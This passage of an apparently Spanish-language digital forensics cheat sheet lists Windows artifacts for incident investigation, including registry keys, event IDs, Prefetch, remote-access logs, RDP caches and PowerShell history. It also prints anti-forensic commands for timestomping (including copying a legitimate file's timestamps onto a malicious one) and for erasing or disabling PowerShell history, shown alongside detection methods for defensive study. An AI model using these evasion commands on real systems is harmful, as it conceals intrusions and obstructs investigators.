HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows - AppInit_DLLs
HKLM:\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows - AppInit_DLLs

# Mittre Technique: T1547.001
HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders - Startup
```

> [!TIP]
> **Información del Registro de Windows para usuarios avanzados**
> 
> Claves predefinidas y tipos de datos: https://learn.microsoft.com/es-es/troubleshoot/windows-server/performance/windows-registry-advanced-users

### 📜 Artefactos de conexiones de clientes VPN

Revisar posibles artefactos de conexiones de clientes VPN realizadas desde un PC comprometido por un actor malicioso.

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles
```

### 📜 Persistencia en servicios

Rama del registro donde se almacenan los valores de imagen de un controlador en un servicio. Usado a veces para mantener persistencia en el sistema.

Analizar ruta y parámetros del valor *"ImagePath"*.
```
HKLM\SYSTEM\CurrentControlSet\Services
```

### 📜 Auditar cambios de membresía en grupos críticos (últimos 15 días)

Event IDs:
- 4732: Se agregó un miembro a un grupo local con seguridad habilitada.
- 4733: Un miembro fue eliminado de un grupo local con seguridad habilitada.

```ps
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4732,4733; StartTime=(Get-Date).AddDays(-15)} | Format-Table TimeCreated, Message
```

### 📜 ¿Han eliminado el registro de eventos de Windows?

¿Los atacantes eliminaron todos los registros de eventos de Windows?

Se puede detectar si los eventos 1102, 104 están presentes en System o Security.
```
1102: Se ha eliminado el registro de eventos de "Security" (este evento se mostrará en "Security").
104: Se ha eliminado el registro de eventos de un log específico. "Application", "System" o cualquiera de los registros de aplicaciones y servicios (este evento se mostrará en "System").
```

VSS (Volume Shadow Copy) podría ser una opción pero hay escenarios donde esto también fue eliminado de forma intencionada.

1. Volcado de memoria: https://www.volatilityfoundation.org/releases
2. Montar con MemProcFS: https://github.com/ufrisk/MemProcFS
3. Copiar los archivos evtx:

```ps
Get-ChildItem -Path F:\pid\ -Include *.evtx -Recurse | Copy-Item -Destination .\evtx_files
```

- Volatility - Referencia evtlogs: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#evtlogs

### 📜 Volatility 3: clipboard

Desde un volcado de memoria, los datos del portapapeles pueden se interesantes para revelar información.

```ps
vol.py -f memdump.bin windows.clipboard
```

### 📜 Comprobar archivos abiertos recientemente por el usuario

Almacena accesos directos a los archivos abiertos recientemente por el usuario.

Win+R > shell:recent
```
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent
```

Almacena archivos recientes abiertos por el usuario en el Explorador de Windows, organizados por extensión, como .txt, .docx o .pdf. También incluye MRUList, que mantiene el orden de los archivos abiertos, y se usa para accesos rápidos en el Explorador de Windows.
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
```

### 📜 Analizar ficheros Windows Prefetch (.pf)

Los archivos **Prefetch (.pf)** de Windows, almacenados en `%SYSTEMROOT%\Prefetch` (C:\Windows\Prefetch), ayudan a optimizar el tiempo de carga de aplicaciones. Resultan interesantes porque almacenan información sobre **qué programas se ejecutaron**, **cuándo**, **cuántas veces**, y **qué recursos del sistema (DLL, rutas, volúmenes)** fueron accedidos.

Estos datos pueden ayudar a reconstruir líneas de tiempo de ejecución, identificar actividad de malware incluso si el ejecutable fue borrado, y detectar anomalías en la carga de DLLs o ejecución de binarios o scripts camuflados, lo que puede indicar técnicas como *DLL sideloading* o *code injection*.

- **[WinPrefetchView (NirSoft)](https://www.nirsoft.net/utils/win_prefetch_view.html)**: Herramienta con GUI que permite examinar archivos .pf y obtener detalles como el ejecutable, fechas y número de ejecuciones, así como los archivos cargados. En una sola vista carga todo el directorio Prefetch y sus ficheros .pf.

- **[PECmd (Eric Zimmerman's tools)](https://ericzimmerman.github.io/#!index.md)**: Herramienta CLI para decodificar y analizar Prefetch. Facilita la extracción de datos de ejecución, la exportación a CSV o JSON y el procesamiento automatizado de múltiples archivos, integrándose también con *[KAPE (Kroll Artifact Parser and Extractor)](https://github.com/EricZimmerman/KapeFiles)*.

```ps
# Mostrar ayuda
PECmd.exe --help

# Analizar un solo archivo .pf
PECmd.exe -f "C:\Windows\Prefetch\CMD.EXE-12345678.pf"

# Analizar todos los .pf en una carpeta
PECmd.exe -d "C:\Windows\Prefetch"

# Exportar resultados a CSV o JSON
PECmd.exe -d "C:\Windows\Prefetch" --csv "C:\Forensics\Prefetch_CSV"
PECmd.exe -d "C:\Windows\Prefetch" --json "C:\Forensics\Prefetch_JSON"
PECmd.exe -d "D:\Evidence\Prefetch" --csv "D:\Output" --json "D:\Output" --debug

# Filtrar solo por ciertos ejecutables
PECmd.exe -d "C:\Windows\Prefetch" | findstr /I "powershell.exe"

# Analizar Prefetch de otro sistema montado en otro volumen offline
PECmd.exe -d "E:\Windows\Prefetch" --csv "E:\Analysis\Prefetch_Results"
```

Ver cómo está configurado Prefetch en el registro, revisando qué tipo de precarga está activada para aplicaciones y arranque.

*HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters ➜ `EnablePrefetcher`*
- 0 = Deshabilitado.
- 1 = Precarga de ejecución de inicio de aplicación habilitada.
- 2 = Precarga del arranque habilitada.
- 3 = Applaunch y Boot habilitados (óptimo y predeterminado) es el valor por defecto.

### 📜 Artefactos Adobe Acrobat: Caché de historial de PDFs abiertos recientemente

*cRecentFiles*: Historial de ubicaciones donde se encuentras los ficheros abiertos recientemente, "cX" donde X será un número asignado.
```
HKEY_CURRENT_USER\Software\Adobe\Adobe Acrobat\DC\AVGeneral\cRecentFiles\cX
HKEY_USERS\<SID-USER>\Software\Adobe\Adobe Acrobat\DC\AVGeneral\cRecentFiles\cX
```

*cRecentFolders*: Historial de carpetas donde se encuentran los ficheros abiertos recientemente, "cX" donde X será un número asignado.
```
HKEY_CURRENT_USER\Software\Adobe\Adobe Acrobat\DC\AVGeneral\cRecentFolders\cX
HKEY_USERS\<SID-USER>\Software\Adobe\Adobe Acrobat\DC\AVGeneral\cRecentFolders\cX
```

*SessionManagement*: Historial de PDFs abiertos en la última sesión de Adobe Acrobat.
```
HKEY_CURRENT_USER\Software\Adobe\Adobe Acrobat\DC\SessionManagement\cWindowsPrev\cWin0\cTab0\cPathInfo
HKEY_USERS\<SID-USER>\Software\Adobe\Adobe Acrobat\DC\SessionManagement\cWindowsPrev\cWin0\cTab0\cPathInfo
```

### 📜 Ventana "Ejecutar" y "barra direcciones de Explorer.exe": Caché de historial de ficheros y paths visitados recientemente 

Cuando escribimos nuevas rutas o ficheros a través de la barra de direcciones de un Explorador de Windows o en una vetana "Ejecutar" (Win+R). Por defecto estos se quedan almacenados con la intención de agilizar la experiencia de usuario. Estos artefactos pueden ser útiles en una recabación de información para una investigación forense con el fin de conocer los sitios, direcciones o ficheros que el usuario visitó con una salida exitosa.

Con la sesión de usuario iniciada HKCU, si se analiza el registro en modo offline será necesario encontrar el SID del usuario que queremos analizar. 

`Ventana "Ejecutar"`
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKEY_USERS\<SID-USER>\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

`Barra de direcciones del Explorador de Windows "Explorer.exe"`
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
HKEY_USERS\<SID-USER>\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
```

### 📜 Thumbcache Viewer

Visualizar ficheros *"thumbcache_\*.db"*.

- https://thumbcacheviewer.github.io

### 📜 Historial de pestañas sin cerrar de Notepad.exe (Win11)

Historial de pestañas sin cerrar de Notepad.exe en Windows 11.

```
"%localappdata%\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState"
```

### 📜 Artefáctos forenses en AnyDesk, Team Viewer y LogMeIn 

`AnyDesk`

Artefactos AnyDesk. 

El registro "ad.trace" revela información como:
- IP remota desde donde se conectó el actor
- Actividad de transferencia de archivos

```
%ProgramData%\AnyDesk\ad_svc.trace
%ProgramData%\AnyDesk\connection_trace.txt
%AppData%\Anydesk\ad.trace
```

En el log "ad.trace" de la carpeta del usuario *AppData* buscamos por los criterios "files" y "app.prepare_task". Esto revelará desde qué carpeta se están copiando los archivos y también la cantidad de archivos copiados.

Otros criterios de búsqueda para idetenficar conexiones en los ficheros "ad.trace" y "ac_svc.trace".

Encontrar en la traza una conexion de acceso saliente, control remoto a otro dispositivo.
```
"Connecting to"
"Client-ID:"
"Connection established." (Esta cadena asegura que se estableció la conexion).
```

Encontrar conexiones entrantes.
```
"Accept request from"
"Client-ID:"
"Accepting the connect request." (Esta cadena informa de que se aceptó la conexión).
"Session stopped." (Fin de la conexion)
```

En el mismo fichero buscamos por el término "External address" y esto revelará la dirección IP remota donde se conectó el actor malicioso. "Files" indicará actividad en el intercambio de ficheros.

`Team Viewer`

Team Viewer - Referencia logs: 
- https://community.teamviewer.com/Spanish/kb/articles/4694-como-localizar-los-archivos-de-registro

Team Viewer - Arquitectura de seguridad en comunicaciones: 
- https://static.teamviewer.com/resources/2020/11/security-encryprion-1.jpg

`LogMeIn`

Artefactos LogMeIn.
```
C:\Program Data\LogMeIn
C:\Users\<username>\AppData\Local\LogMeIn
```
```
SOFTWARE\LogMeIn\Toolkit\DesktopSharing
SOFTWARE\LogMeIn\V5 LogMeIn\Toolkit\Filesharing
SOFTWARE\LogMeIn\V5
SOFTWARE\LogMeIn Ignition
```

### 📜 Sesiones de conexión remota almacenadas con PuTTY, MobaXterm, WinSCP (SSH, RDP, FTP, SFTP, SCP u otras)

Claves de registro y paths de Windows donde se pueden encontrar sesiones guardas y previamente establecidas de conexiones SSH, RDP, FTP, SFTP, SCP, etc. usando *MobaXterm*, *PuTTY* o *WinSCP*. Se trata de valores de cadena tipo REG_SZ donde se almacena información como los usuarios, IPs y la password cifrada en caso de ser guardada en estos clientes usados para establecer conexiones remotas.

`MobaXterm`
```
HKCU\Software\Mobatek\MobaXterm\<M><C><P>
%USERPROFILE%\Documents\MobaXterm\MobaXterm.ini
```

`PuTTY`
```
HKCU\Software\SimonTatham\PuTTY\Sessions
```

`WinSCP`
```
HKCU\Software\Martin Prikryl\WinSCP 2\Sessions
```

### 📜 Artefactos y trazabilidad en conexiones RDP

Las conexiones RDP dejan rastros en el registro y los eventos de Windows que, analizados en conjunto, permiten reconstruir la trazabilidad completa: quién se conectó, a qué servidor, si el sistema aceptaba accesos entrantes y si realmente la conexión fue exitosa, logrando así la “foto completa” de una posible intrusión remota.

**Registro de Windows**

Usuarios que se han conectado recientemente:
```
HKCU\SOFTWARE\Microsoft\Terminal Server Client\Default
```

Nombres de usuario utilizados en conexiones:
```
HKCU\SOFTWARE\Microsoft\Terminal Server Client\Servers
```

Comprobar si un sistema acepta RDP entrantes:
```
HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server
```
`fDenyTSConnections`
- 0 = se permiten conexiones RDP
- 1 = se deniegan conexiones RDP

**Registro de eventos**

| Evento | Logon Type | Resultado | Descripción |
|:------:|:----------:|:---------:|-------------|
| 4624   | 10         | Éxito     | Inicio de sesión remoto interactivo (conexiones RDP habituales) |
| 4624   | 12         | Éxito     | Inicio de sesión remoto con RemoteFX |
| 4625   | 3          | Fallo     | La sesión falla antes de que se complete la sesión (NLA habilitado) |
| 4625   | 10         | Fallo     | La sesión remota se inicia primero y falla después (NLA deshabilitado o versiones antiguas) |
| 1149   | -          | Éxito     | Conexión RDP exitosa desde un host remoto |
| 21     | -          | Éxito     | Inicio de sesión correcto (antiguo, Terminal Services) |

### 📜 Artefactos Bitmaps y Prefetch en RDP

Artefactos forenses asociados al uso de RDP con especial foco en la *caché de mapa de bits* y en evidencias de *prefetch* del cliente RDP. Al menos que se indique lo contrario en el momento de conexión, la caché no se borra automáticamente al cerrar sesión RDP.

**`RDP Bitmap Cache`**
```
C:\Users\<usuario>\AppData\Local\Microsoft\Terminal Server Client\Cache
Cache000.bin
Cache001.bin
...
```
Estos ficheros contienen bitmaps en bruto almacenados por el cliente RDP para optimizar sesiones posteriores. Contienen fragmentos gráficos almacenados localmente durante las sesiones RDP, donde se pueden encontrar:

- Fragmentos de pantallas RDP.
- Iconos y fondos.
- Ventanas de aplicaciones.
- Texto visible (usuarios, aplicaciones, rutas, interfaces). 

Estos artefactos pueden permitir la reconstrucción parcial de la actividad visual realizada durante sesiones RDP anteriores.

**Herramientas de análisis para bitmaps de RDP (Cache000.bin, etc)**
- ***RdpCacheStitcher***: https://github.com/BSI-Bund/RdpCacheStitcher
- ***bmc-tools***: https://github.com/ANSSI-FR/bmc-tools
- ***X-Ways Forensics***: https://www.x-ways.net
- ***Autopsy***: https://www.autopsy.com
- ***EnCase Forensic***: https://www.opentext.com/produits/encase-forensic

**`Bitmap Carving manual`**

Buscar cabeceras BMP:
```
42 4D
```

Ejemplo para buscarlo con PowerShell:
```ps
Get-ChildItem Cache*.bin | % {
  Select-String -Path $_ -Pattern "BM" -AllMatches
}
```
**`Archivos Prefetch (MSTSC.EXE-*.pf)`**

Los archivos Prefetch asociados a "mstsc.exe" pueden aportar información relevante como:

- Frecuencia de uso del cliente RDP.
- Última ejecución.
- Archivos y recursos accedidos.

Este artefacto es útil para **corroborar el uso del cliente RDP** y establecer líneas temporales de actividad.

```
C:\Windows\Prefetch\MSTSC.EXE-*.pf
```

**`Prevención y mitigación (desactivar 'Persistent bitmap caching' en RDP)`**

Para reducir la exposición forense y el riesgo de filtración, se recomiendan las siguientes medidas:

- Desactivar la caché de mapas de bits en RDP:
  - **Opción 1**, Archivo ".rdp": 
  ```
  En el archivo de conexión RDP, añadir explícitamente la siguiente línea: *bitmapcachepersistenable:i:0*
  ```
  - **Opción 2**, Interfaz gráfica del cliente RDP (mstsc.exe): 
  ```
  Ejecutar "mstsc.exe" > Mostrar opciones > Rendimiento > Desmarcar la opción: Persistent bitmap caching (Almacenamiento en caché persistente de mapas de bits)
  ```

  - **Opción 3**, Directiva de Grupo GPO: 
  ```
  Plantillas Administrativas > Componentes de Windows > Servicios de Escritorio Remoto > Host de sesión de Escritorio remoto > Entorno de sesión remota > "No usar caché de mapa de bits"
  ```
- **Opción manual**: Limpiar regularmente archivos temporales y la caché del sistema después de finalizar cada conexión RDP.

### 📜 Caché almacenada de conexiones establecidas a otros hosts vía RDP

Si el equipo afectado a sido comprometido y a través de este se hizo un uso como "equipo puente" en movimientos laterales, etc. Puede resultar útil comprobar la caché almacenada de conexiones establecidas vía RDP hacia otros hosts ya sea de la misma red o de un RDP externo con el objetivo por ejemplo de exfiltrar información hacia un stage controlado por el actor malicioso.

En la siguiente clave de registro podemos encontrar las conexiones remotas RDP (Remote Desktop Protocol) realizadas desde la máquina afectada. Se creará un nueva clave por cada conexión RDP.
```
HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers
HKEY_USERS\<SID_USER>\SOFTWARE\Microsoft\Terminal Server Client\Servers 
```

Situado en la misma ruta, se puede ver la clave "Default". Esta clave nos indica el orden de prioridad que se mostrará la lista de conexiones al desplegar la barra de la ventana de "Conexión a Escritorio remoto" que se abre al ejecutar el binario de mstsc.exe.
```
HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default
```

### 📜 Conocer la URL de descarga de un archivo (ADS Zone.Identifier)

Saber si un archivo malicioso se descargó de Internet y desde que URL o se creó en el sistema local.

**ADS (Alternate Data Stream)** permite almacenar archivos dentro de archivos. Es una característica de NTFS, fue diseñada para brindar compatibilidad con el sistema de archivos jerárquico de MacOS (HFS). HFS usaba una bifurcación de recursos y una bifurcación de datos (2 flujos) para almacenar los datos de un archivo. 

PowerShell
```ps
Get-Content -Path .\<FileName> -Stream Zone.Identifier -Encoding oem
```

CMD
```cmd
notepad <FileName>:Zone.Identifier
```

### 📜 Modificar y detectar Timestomping en ficheros (técnica anti-forense)

Es posible que un actor malicioso o un insider intente modificar las marcas de tiempo de un fichero para modificar su fecha y hora de creación, modificación y acceso con la finalidad de realizar "técnicas anti-forense" para intentar confundir, alterar y dilatar una posible investigación forense.

Aunque en sistemas Windows o Linux es posible modificar los timestamps ya sea de forma nativa como usando software de terceros, es posible analizar y detectar estas alteraciones cuando se realiza un proceso de análisis forense.

`Los 4 timestamps (MACB)`

| Atributo | Timestamp | Evento que lo actualiza |
|----------|-----------|-------------------------|
| m | Modify time | Cambios en el contenido del archivo |
| a | Access time | Lectura/acceso al archivo |
| c | Change time | Cambios en los metadatos (chown, rename) |
| cr | Creation time | Momento en que el archivo fue creado |

`Windows - Obtener y modificar Timestamps`

Obtener los timestamps de un fichero con PowerShell.
```ps
Get-ChildItem file.txt | Format-List -Property *
Get-Item file.txt | Format-List -Property FullName, CreationTime, CreationTimeUtc, LastAccessTime, LastAccessTimeUtc, LastWriteTime, LastWriteTimeUtc
```

**Modificar los timestamps** de creación (CreationTime), última modificación (LastWriteTime) y última vez que se leyó (LastAccessTime) un fichero con PowerShell.
```ps
(Get-ChildItem file.txt).LastWriteTime=$(Get-Date "16/4/2019 12:34 am")
(Get-ChildItem file.txt).CreationTime=$(Get-Date "16/4/2019 12:34 am")
(Get-ChildItem file.txt).LastAccessTime=$(Get-Date "16/4/2019 12:34 am")
```

Modificar timestamps UTC.
```ps
(Get-ChildItem file.txt).LastWriteTimeUtc=$(Get-Date "16/4/2019 12:34 am")
(Get-ChildItem file.txt).CreationTimeUtc=$(Get-Date "16/4/2019 12:34 am")
(Get-ChildItem file.txt).LastAccessTimeUtc=$(Get-Date "16/4/2019 12:34 am")
```

Modificar timestamps de ficheros con herramientas CLI (post-explotación):

- Timestomp - modifica $STANDARD_INFORMATION directamente en NTFS: https://github.com/EternalNOP/Timestomping
- nTimetools - permite precisión en nanosegundos: https://github.com/limbenjamin/nTimetools

> [!NOTE]
> Estas herramientas generalmente solo afectan a $STANDARD_INFORMATION, no a $FILE_NAME.

Modificar timestamps de ficheros con sofware de terceros (GUI).

- BulkFileChanger: https://www.nirsoft.net/utils/bulk_file_changer.html
- FileDate Changer: https://www.nirsoft.net/utils/filedatech.html
- NewFileTime: https://www.softwareok.com/?seite=Microsoft/NewFileTime
- Change Timestamp: https://www.majorgeeks.com/files/details/change_timestamp.html
- Attribute Changer: https://www.petges.lu/download/
- Bulk Rename Utility: https://www.bulkrenameutility.co.uk/Download.php
- Advanced Renamer: https://www.advancedrenamer.com/download

`Linux - Obtener y modificar Timestamps`

El comando ***stat*** muestra información detallada sobre archivos y directorios, como su tamaño, tipo, permisos y fechas de acceso, modificación y cambio.
```bash
stat file.txt
```

**Modificar los timestamp** de acceso, modificación y cambio de un archivo.
- Acceso: última vez que se leyó el archivo.
- Modificar: última vez que se modificó el archivo (se ha modificado el contenido).
- Cambiar: última vez que se cambiaron los metadatos del archivo (por ejemplo, los permisos)

```bash
touch -a -m -t 201912180130.09 file.txt
# Formato: YYMMDDhhmm.SS
# -a = accessed
# -m = modified
# -t = timestamp
```

Copiar los timestamps de un fichero legítimo a uno malicioso.
```bash
touch malicious_file -r existing_legit_file
```
Modificar el cr time (creation time) con debugfs (requiere root). Es el único método para alterar el timestamp de creación en Ext4, ya que touch no puede modificarlo.

> [!WARNING]
> Manipular directamente los inodes puede afectar la integridad del sistema de archivos.

```bash
# 1. Identificar el inode del archivo
stat archivo | grep Inode

# 2. Identificar el dispositivo
df archivo

# 3. Modificar el cr time con debugfs
sudo debugfs -w /dev/sdX
> set_inode_field <inode> crtime 1984-01-01 13:12:00
> quit
```

`macOS - Obtener y modificar Timestamps`

Modificar m y a:
```bash
touch -t 198401011312 archivo
```

Instalar y modificar con Xcode
```bash
# Instalar Xcode Command Line Tools (requerido para SetFile y GetFileInfo)
xcode-select --install

# Consultar timestamps del fichero
GetFileInfo archivo.txt

# Modificar fecha de creación
SetFile -d "01/01/1984 13:12:00" archivo.txt

# Modificar fecha de modificación
SetFile -m "01/01/1984 13:12:00" archivo.txt
```

**`Detección de timestomping`**

> [!IMPORTANT]
> Modificar timestamps no altera el hash del archivo, por lo que la verificación por hash no sirve para detectar esta técnica anti-forense.

```bash
touch -a -m -t 201712180130.09 file.txt
sha1sum file.txt
   63bbfea82b8880ed33cdb762aa11fab722a90a24 file.txt
touch -a -m -t 201812180130.09 file.txt
sha1sum file.txt
   63bbfea82b8880ed33cdb762aa11fab722a90a24 file.txt
```

**Linux**
| Método | Comando / Herramienta |
|--------|-----------------------|
| Comparar `cr` vs `m` (si `m` < `cr` = manipulación) | `sudo debugfs -R "stat archivo" /dev/sdX \| grep -E "crtime\|mtime"` |
| Metadatos internos del fichero | `exiftool archivo` |
| Auditoría de cambios | `auditctl -w archivo -p wa -k ts_change` |
| Historial sospechoso | `grep debugfs ~/.bash_history` |

En Linux con el comando ***stat*** podemos obtener información sobre los timestamp, sin embargo no nos muestra los timestamp de metadatos del propio fichero.
```bash
stat file.txt
  Access: 2019-12-18 01:30:09.000000000 +0100
  Modify: 2019-12-18 01:30:09.000000000 +0100
  Change: 2024-04-29 23:05:51.644885838 +0200
  Birth: 2024-04-29 22:59:00.618199663 +0200
```
Para poder analizar y detectar posibles modificaciones de timestamp es posible hacerlo usando ***exiftool*** donde se muestran los metadatos del propio fichero obteniendo los timestamp originales en los atributos *"Create Date, Modify Date y Metadata Date"*.

- ExifTool: https://exiftool.org

```bash
exiftool file.txt
  File Modification Date/Time   : 2019:12:18 01:30:09+01:00
  File Access Date/Time         : 2019:12:18 01:30:09+01:00
  File Inode Change Date/Time   : 2024:04:29 23:05:51+02:00
  Create Date                   : 2024:04:17 11:54:20+02:00
  Modify Date                   : 2024:04:28 14:03:17+02:00
  Metadata Date                 : 2024:04:28 14:03:17+02:00
```

> [!NOTE]
> Una discrepancia entre los timestamps del sistema (stat) y los metadatos internos (exiftool) es un indicador claro de manipulación.

**Windows**
| Método | Comando / Herramienta |
|--------|-----------------------|
| Comparar `$STANDARD_INFORMATION` vs `$FILE_NAME` | MFTECmd, Autopsy, FTK |
| Timestamps con precisión anómala (`.0000000`) | Análisis manual del `$MFT` |
| Registro de cambios en tiempo real | Sysmon Event ID 2 |
| Cruce con artefactos del sistema | Prefetch, Event Log, Registro |

> [!NOTE]
> $FILE_NAME es actualizado por el kernel y es mucho más difícil de falsificar. Una discrepancia entre $STANDARD_INFORMATION y $FILE_NAME es señal clara de timestomping. Los timestamps legítimos de NTFS tienen precisión de 100 nanosegundos, si todos terminan en .0000000, puede indicar uso de herramientas de timestomping.

Detectar posibles modificaciones de timestamp usando **Autopsy**. 

- Autopsy: https://www.autopsy.com/download

Es posible obtener los metadatos del propio archivo y comprobar los timestamps originales.

1. Crear un nuevo proyecto.
2. Add Data Source.
3. Logical Files.
4. Añadir los ficheros manualmente.
5. Marcar las tres opciones que incluyen los "Timestamps" (Modified Time, Creation Time, Access Time).
6. Pestaña "Hex" podemos analizarlo manualmente y encontrar los timestamps.
7. También en las pestañas: "File Metadata" y "Analysis Results".
8. Si se trata de un fichero ofimático o pdf se añadirá un nuevo desplegadable "Data Artifacts > Metadata" donde también podemos visualizar los timestamps originales.

### 📜 Windows Search Index (archivos Windows.edb, .crwl, .blf, .jrs)

Windows Search Index es el sistema de búsqueda de Windows. Mantiene un índice interno en el archivo Windows.edb, que almacena información sobre archivos y carpetas del sistema: nombres, rutas, extensiones, fechas, e incluso contenido parcial si el tipo de archivo es indexable (como .txt, .docx, .pdf, etc.). 

Este archivo funciona como una base de datos en formato [ESE (Extensible Storage Engine)](https://learn.microsoft.com/es-es/windows/win32/extensible-storage-engine/extensible-storage-engine), también conocido como Jet Blue, un motor de base de datos embebido utilizado por Windows para estructurar y acceder eficientemente a grandes volúmenes de datos indexados.

Este índice contiene artefactos forenses, pudiendo obtener evidencias de archivos eliminados o modificados incluso cuando ya no existen físicamente en el sistema. Aunque también existen técnicas anti-forenses orientadas a manipular, desactivar o vaciar este índice.

**Archivos relacionados y rutas clave:**

- **Windows.edb**: Base de datos ESE principal del índice de búsqueda.
  - Ruta: `C:\ProgramData\Microsoft\Search\Data\Applications\Windows\Projects\SystemIndex\`
  - Windows.edb puede contener: Rutas de archivos borrados, metadatos (creación, modificación, acceso), texto parcial o propiedades del archivo indexado.

-  **.crwl**: Logs de rastreo de archivos indexados (crawling logs).
   - Ruta: `C:\ProgramData\Microsoft\Search\Data\Applications\Windows\GatherLogs\SystemIndex\`
   - .crwl logs que muestran: Qué archivos fueron indexados y cuándo, errores, eventos de crawling, cambios recientes.

- **.blf, .jrs, .log**: Archivos de soporte del motor ESE (logs de transacción).
  - Ruta: `C:\ProgramData\Microsoft\Search\Data\Applications\Windows\`

**Consideraciones clave**

- **Windows.edb** suele estar **bloqueado** por el sistema; requiere extracción offline o con herramientas especializadas para el análisis en frío.
- El índice puede persistir durante mucho tiempo si no es reconstruido manualmente.
- Cada extensión tiene asociado un **PersistentHandler** que determina si el contenido es indexado.
  - PersistentHandler: GUID que define cómo el sistema accede al contenido de un archivo, permite la indexación, lectura estructurada y extracción de metadatos.

**Herramientas para analizar el fichero Windows.edb y .crwl**

- [EseDatabaseView](https://www.nirsoft.net/utils/ese_database_view.html): Visualiza y exporta el contenido de Windows.edb.
- [FTK Imager](https://accessdata.com/product-download/ftk-imager-version-4-5): Clonado y acceso forense a contenido de archivos bloqueados.
- [EseDatabaseView – NirSoft](https://www.nirsoft.net/utils/ese_database_view.html): Lee y muestra los datos almacenados en la base de datos del motor de almacenamiento (ESE).

### 📜 PSReadLine: Historial de comandos ejecutados en una consola PowerShell

El historial de comandos en PowerShell o PowerShell Core no está integrado en el marco de administración de Windows, sino que se basa en el módulo **PSReadLine**. El módulo PSReadLine en Windows se encuentra en la carpeta `C:\Program Files\WindowsPowerShell\Modules\PSReadline` y se importa automáticamente cuando inicia la consola PowerShell.

Esto puede ser útil en una investigación forense cuando un posible actor malicioso actuó sobre la cuenta del usuario o hizo al usuario ejecutar ciertas acciones bajo PowerShell.

Por defecto PSReadline almacena un historial de 4096 comandos en un archivo de texto sin formato en el perfil de cada usuario **ConsoleHost_history.txt** ubicado en el siguiente path. 
```
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

En el caso de que se usara una consola bajo VSC Visual Studio Code, encontraremos en el mismo path el fichero **Visual Studio Code Host_history.txt**.
```
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Visual Studio Code Host_history.txt
```

Si tenemos acceso al propio contexto del usuario en su equipo podemos usar también la búsqueda inversa de forma repetida `CTRL+R` para poder ver el historial. `CTR+S` sería para una búsqueda directa.

Comprobar si el módulo está instalado.
```ps
Get-Module | Where-Object {$_.name -like "*PSReadline*"}
```

Ver el historial de comandos directamente en un output de sesión PowerShell.
```ps
Get-Content (Get-PSReadlineOption).HistorySavePath
```

Mostrar más opciones de configuración del módulo de PSReadline.
```ps
Get-PSReadlineOption | Select-Object HistoryNoDuplicates, MaximumHistoryCount, HistorySearchCursorMovesToEnd, HistorySearchCaseSensitive, HistorySavePath, HistorySaveStyle
```

Mostrar directamente el path donde está ubicado el fichero *ConsoleHost_history.txt*.
```ps
(Get-PSReadlineOption).HistorySavePath
```

Aumentar la cantidad de comandos de PowerShell almacenados en el registro.
```ps
Set-PSReadlineOption -MaximumHistoryCount 10000
```

En el caso de haber establecido algún tipo de secreto, password o token. Es posible eliminar solo el comando anterior del historial.  
```ps
Clear-History -Count 1 -Newest
```

Eliminar todos los comandos del historial que hagan match con un patrón específico.
```ps
Clear-History -CommandLine *set-ad*
```

Para eliminar completamente el historial de comandos de PowerShell, se debe eliminar el archivo ConsoleHost_history.txt en el que escribe el módulo PSReadline o directamente ejecutar lo siguiente en consola.
```ps
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

Deshabilitar completamente el almacenamiento del historial de comandos de PowerShell.
```ps
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

### 📜 Artefactos forense - MS Word

`Eventos de alertas MS Office`

```
Event Viewer > Applications and Services Logs > Microsoft Office Alerts
```

`Conocer las URLs visitadas desde Word`

¿Cómo saber si la víctima hizo clic en una URL maliciosa de un documento de MS Word? 

El valor de **"UseRWHlinkNavigation"** contiene la última URL a la que se accedió desde MS Word.
```
HKEY_USERS\<SID>\SOFTWARE\Microsoft\Office\16.0\Common\Internet
```

La siguiente clave contiene subclaves con los destinos remotos que MS Word estaba tratando de alcanzar.
```
HKEY_USERS\<SID>\SOFTWARE\Microsoft\Office\16.0\Common\Internet\Server Cache
```

`Ficheros abiertos recientemente en Word`

Revisar el siguiente directorio y el contenido del fichero **"inditex.dat"**.
```
%AppData%\Microsoft\Office\Recent
```

`Ficheros de inicio en Word`

Cuando un usuario inicia MS Word los archivos de esta ubicación se cargan automáticamente. Estos archivos estarán en formato .dot, .dotx o .dotm.
```
%AppData%\Microsoft\Word\STARTUP
```

`Buscar archivos recientes con macros habilitadas`

Contiene una lista de nombres de archivo. Los valores con "FF FF FF 7F" al final, indican que tienen la macro habilitada.
```
HKCU\SOFTWARE\Microsoft\Office\<version>\Word\Security\TrustedDocuments\TrustRecords
```

`Macros de seguridad en Word`

**"VBAWarnings"** indica el estado de las macros de seguridad.

- Valor 1: todas las macros están habilitadas
- Valor 2: todas las macros están desactivadas con notificación 
- Valor 3: todas las macros están desactivadas excepto las firmadas digitalmente.
- Valor 4: todas las macros están desactivadas sin notificación.

```
HKCU\Software\Policies\Microsoft\Office\<version>\Word\Security\VBAWarnings
```

`Caché de Word`

Esta ubicación se utiliza para almacenar los archivos *scratch* de MS Word. Si un usuario abre un archivo .docx con macro, Word puede crear un archivo *"WRCxxxx.tmp"*. Este archivo puede contener varios artefactos.
```
%LocalAppdata%\Microsoft\Windows\INetCache\Content.Word
```

